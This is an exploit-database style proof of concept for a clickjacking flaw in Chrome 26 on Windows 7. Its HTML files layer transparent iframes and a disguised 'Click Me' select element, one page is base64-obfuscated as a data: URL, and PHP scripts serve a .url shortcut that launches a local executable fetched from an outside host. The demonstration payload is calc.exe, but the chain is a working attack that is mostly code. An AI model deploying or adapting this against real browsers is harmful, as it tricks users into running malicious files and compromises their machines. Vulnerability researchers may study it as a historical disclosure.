# Exploit Title: [Google Chrome Clickjacking execute malicious file]

# Date: [17/05/2013]

# Exploit Author: [Jordi Chancel]

# Vendor Homepage: [http://www.google.com/]

# Software Link: [http://www.google.com/intl/fr/chrome/browser/]

# Version: [google chrome 26.0.1410.64]

# Tested on: [windows 7]

# CVE : [not CVE yet]

A small exploit for google 
chrome stable version , it's a clickjacling vulnerability that lead to 
execute malicious downloaded files that execute calc.exe (look this video : https://www.youtube.com/watch?v=KjSr5uZMJUE )

index.html
<div 
style="z-index:2; opacity:5.0; filter:alpha(opacity=0); top:0px; ">
<iframe 
src="./test9.html"
 width="99%" height="99%" frameborder="0"></iframe>
</div>
<div id="page" style="z-index:-1; position:absolute; top:0px; 
height:99%; paddingtop:0px; width:99%; text-indent:0px;">
<iframe 
src="./test.html"
 width="99%" height="99%" frameborder="0"></iframe>



----


test9.html

<!DOCTYPE html>
<html>
  <head>
    <style>
      #spoof {
        position:absolute;
        left:0px; top:0px;
        width:607px;
        background:transparent;
        border:0;
        outline:none;
        z-index = 1;
      }
    </style>
   <style>
html, body {
    margin:0;
    padding:0;
    height:100%;
}

#canevas {
    min-height:100%;
    position:relative;
}

#contenu {
    padding:10px;
    padding-bottom:60px;
}

#piedDePage {
    position:absolute;
    bottom:0;
    width:100%;
    height:105px;
left:-10px;
}
    </style>


<script>
function step1() {
        var w = window.open('about:blank', '_blank');
        w.opener = null;
        w.document.location = 'data:text/html;base64,PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0  MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93  d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC  5kdGQiPgogPCFET0NUWVBFIGh0bWw+CiA8aHRtbCB4bWxucz0i  aHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CiA8aGVhZD  4KIDxtZXRhIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1J  U08tODg1OS0xIiBodHRwLWVxdWl2PSJjb250ZW50dHlwZSIgLz  4KIDx0aXRsZT50ZXN0PC90aXRsZT4KICAgICA8c3R5bGU+CiAg  ICAgICAjc3Bvb2YgewogICAgICAgICBwb3NpdGlvbjphYnNvbH  V0ZTsKICAgICAgICAgbGVmdDowcHg7IHRvcDowcHg7CiAgICAg  ICAgIHdpZHRoOjYwMDBweDsKICAgICAgICAgYmFja2dyb3VuZD  p0cmFuc3BhcmVudDsKICAgICAgICAgYm9yZGVyOjA7CiAgICAg  ICAgIG91dGxpbmU6bm9uZTsKICAgICAgICAgei1pbmRleCA9ID  E7CiAgICAgICB9CiAgICAgPC9zdHlsZT4KICAgIDxzdHlsZT4K  IGh0bWwsIGJvZHkgewogICAgIG1hcmdpbjowOwogICAgIHBhZG  Rpbmc6MDsKICAgICBoZWlnaHQ6MTAwJTsKIH0KIAogI2NhbmV2  YXMgewogICAgIG1pbi1oZWlnaHQ6MTAwJTsKICAgICBwb3NpdG  lvbjpyZWxhdGl2ZTsKIH0KIAogI2NvbnRlbnUgewogICAgIHBh  ZGRpbmc6MTBweDsKICAgICBwYWRkaW5nLWJvdHRvbTo2MHB4Ow  ogfQogCiAjcGllZERlUGFnZSB7CiAgICAgcG9zaXRpb246YWJz  b2x1dGU7CiAgICAgYm90dG9tOjA7CiAgICAgd2lkdGg6MTIwJT  sKICAgICBoZWlnaHQ6NDBweDsKICAgICBsZWZ0OjY2MHB4Owog  fQogICAgIDwvc3R5bGU+CiA8c2NyaXB0PgogZnVuY3Rpb24gc3  RlcDIoKSB7CiAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24o  KSB7CiAKICAgICAgICAgICAgICAgICB2YXIgeGhyID0gbmV3IF  hNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICAgeGhy  Lm9wZW4oJ0dFVCcsICdodHRwOi8vYWx0ZXJuYXRpdi10ZXN0aW  5nLmZyL1Jlc2VhcmNoLzQzMjEvMS5waHAnLCBmYWxzZSk7CiAg  ICAgICAgICAgICAgICAgeGhyLnNlbmQoKTsKICAgICAgICAgIC  AgICAgICAvL3ZhciBkID0gbmV3IERhdGUoKTsKICAgICAgICAg  ICAgICAgICAvL3doaWxlIChuZXcgRGF0ZSgpIC0gZCA8IDUwMD  ApIDsKICAgICAgICAgfSwgMTApOwogfQogPC9zY3JpcHQ+CiA8  c2NyaXB0PnNldFRpbWVvdXQoImFsZXJ0KCdjbGljayB0byB0aG  UgY2xpY2ttZSBnYW1lJykiLCA2MDAwKTs8L3NjcmlwdD4KIDxk  aXYgaWQ9ImNhbmV2YXMiPgogCiAgICAgPGRpdiBpZD0iZW5UZX  RlIj48L2Rpdj4KICAgICA8ZGl2IGlkPSJjb250ZW51Ij48L2Rp  dj4KICAgICA8ZGl2IGlkPSJwaWVkRGVQYWdlIiA+CiAgIDxzZW  xlY3QgaWQ9InNwb29mIiBvbm1vdXNlZG93bj0iZG9jdW1lbnQu  bG9jYXRpb249J2h0dHA6Ly9hbHRlcm5hdGl2LXRlc3RpbmcuZn  IvUmVzZWFyY2gvNDMyMS9kb3dubG9hZDIucGhwJztzdGVwMigp  Owogc3RlcDIoKSIgc3R5bGU9ImZvbnQtc2l6ZTogMjZweDsiPg  ogICAgICAgPG9wdGlvbiBzdHlsZT0iZGlzcGxheTpub25lOyIg  c2VsZWN0ZWQ+Q2xpY2sgTWU8L29wdGlvbj4KICAgICAgIDxvcH  Rpb24gZGlzYWJsZWQgc3R5bGU9ImJhY2tncm91bmQ6I0ZGRjsg  Y29sb3I6IzAwMDsiPiZuYnNwOzwvb3B0aW9uPgogICAgICAgPG  9wdGlvbiBkaXNhYmxlZCBzdHlsZT0iYmFja2dyb3VuZDojRkZG  OyBjb2xvcjojMDAwOyI+Jm5ic3A7PC9vcHRpb24+CiAgICAgPC  9zZWxlY3Q+CiAKIDwvZGl2PgogPC9kaXY+CiAgIDwvYm9keT4K  IDwvaHRtbD4=';

        window.focus();
}






function step2() {
        setTimeout(function() {
step1();
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://alternativ-testing.fr/Research/4321/1.php', false);
                xhr.send();
                //var d = new Date();
                //while (new Date() - d < 5000) ;
        }, 10);
}
</script>
<!--
 *convert to base64
 *<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 *<!DOCTYPE html>
 *<html xmlns="http://www.w3.org/1999/xhtml">
 *<head>
 *<meta content="text/html; charset=ISO-8859-1" http-equiv="contenttype" />
 *<title>test</title>
 *    <style>
 *      #spoof {
 *        position:absolute;
 *        left:0px; top:0px;
 *        width:6000px;
 *        background:transparent;
 *        border:0;
 *        outline:none;
 *        z-index = 1;
 *      }
 *    </style>
 *   <style>
 *html, body {
 *    margin:0;
 *    padding:0;
 *    height:100%;
 *}
 *
 *#canevas {
 *    min-height:100%;
 *    position:relative;
 *}
 *
 *#contenu {
 *    padding:10px;
 *    padding-bottom:60px;
 *}
 *
 *#piedDePage {
 *    position:absolute;
 *    bottom:0;
 *    width:120%;
 *    height:40px;
 *    left:660px;
 *}
 *    </style>
 *<script>
 *function step2() {
 *        setTimeout(function() {
 *
 *                var xhr = new XMLHttpRequest();
 *                xhr.open('GET', 'http://alternativ-testing.fr/Research/4321/1.php', false);
 *                xhr.send();
 *                //var d = new Date();
 *                //while (new Date() - d < 5000) ;
 *        }, 10);
 *}
 *</script>
 *<script>setTimeout("alert('click to the clickme game')", 6000);</script>
 *<div id="canevas">
 *
 *    <div id="enTete"></div>
 *    <div id="contenu"></div>
 *    <div id="piedDePage" >
 *  <select id="spoof" onmousedown="document.location='http://alternativ-testing.fr/Research/4321/download2.php';step2();
 *step2()" style="font-size: 26px;">
 *      <option style="display:none;" selected>Click Me</option>
 *      <option disabled style="background:#FFF; color:#000;"> </option>
 *      <option disabled style="background:#FFF; color:#000;"> </option>
 *    </select>
 *
 *</div>
 *</div>
 *  </body>
 *</html>
-->
<div id="layer1" style="width:200px; height:200px; position:absolute; left:10px; top:70px; z-index:1;">
<button onclick="step1();alert('Click to ClickMe Game');">CLICKME 1 (First)</button>
</div>

  </head>
  <body style="overflow:hidden;" onmousedown="go()" >
<div id="layer2" style="width:200px; height:200px; position:absolute; left:394px; top:115px; z-index:1;">
    <a href="http://www.youtube.com/watch?v=KjSr5uZMJUE">http://www.youtube.com/watch?v=KjSr5uZMJUE</a>
</div>
<div id="canevas">

    <div id="enTete"></div>
    <div id="contenu"></div>
    <div id="piedDePage">
    <select id="spoof" onmousedown="document.location='http://alternativ-testing.fr/Research/4321/download2.php';
step2()" style="font-size: 26px;">
      <option style="display:none;" selected>     Click Me</option>
      <option disabled style="background:#FFF; color:#000;"> </option>
      <option disabled style="background:#FFF; color:#000;"> </option>
    </select> 

</div>



----

test.html 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=ISO-8859-1" http-equiv="contenttype" />
<title>test</title>
</head>
<body>
<br/>

</body>
</html>   <style>
html, body {
    margin:0;
    padding:0;
    height:100%;
}

#canevas {
    min-height:100%;
    position:relative;
}

#contenu {
    padding:-10px;
    padding-bottom:-10px;
}

#piedDePage {
    position:absolute;
    bottom:0;
    width:100%;
    height:90%;
}
    </style>


  </head>

<div id="canevas">

    <div id="enTete"><div id="layer2" style="width:200px; height:200px; position:absolute; left:394px; top:115px; z-index:1;">
    <a href="http://www.youtube.com/watch?v=KjSr5uZMJUE">http://www.youtube.com/watch?v=KjSr5uZMJUE</a>
</div></div>
    <div id="contenu"><br />
</div>
    <div id="piedDePage">
<br />



</div>

</div>


---


download2.php

<?php
Header("Content-type: application/url"); //no comment
Header("Content-Disposition: inline; filename=1 CLICKME   Click Me.url"); 
readfile("666666.URL"); 
?>


---

1.php


<?php

sleep(10000);

?>

---

666666.url

[InternetShortcut]
URL=file:///C:/windows/system32/calc.exe
IDList=
HotKey=0
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,9




 		 	   		  